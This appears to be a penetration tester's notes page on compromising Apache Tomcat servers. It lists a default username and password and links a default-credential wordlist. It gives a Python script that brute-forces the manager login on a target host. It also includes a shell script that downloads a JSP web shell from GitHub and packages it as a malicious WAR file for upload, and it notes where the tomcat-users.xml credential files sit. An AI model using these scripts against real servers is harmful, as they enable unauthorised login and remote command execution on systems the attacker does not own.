#### Login
Try `tomcat : s3cret`
If not successful, try this list:
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```python - kali
#!/usr/bin/env python
import sys
import requests
with open('tomcat-betterdefaultpasslist.txt') as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get('http://$TARGET:8080/manager/html', auth=(c[0], c[1]))
        if r.status_code == 200:
            print "Found valid credentials \"" + line.strip('\n') + "\""
            raise sys.exit()
```
#### Malicious war upload
[[0._Reverse shells (WEB)#jar war]]
OR
```bash - kali
#!/bin/sh
wget https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp -O index.jsp
rm -rf wshell
rm -f wshell.war
mkdir wshell
cp index.jsp wshell/
cd wshell
jar -cvf ../wshell.war *
```
![[1._rlwrap]]
#### Configuration file
`/opt/tomcat/conf/tomcat-users.xml'
`/usr/share/tomcat9/conf/tomcat-users.xml`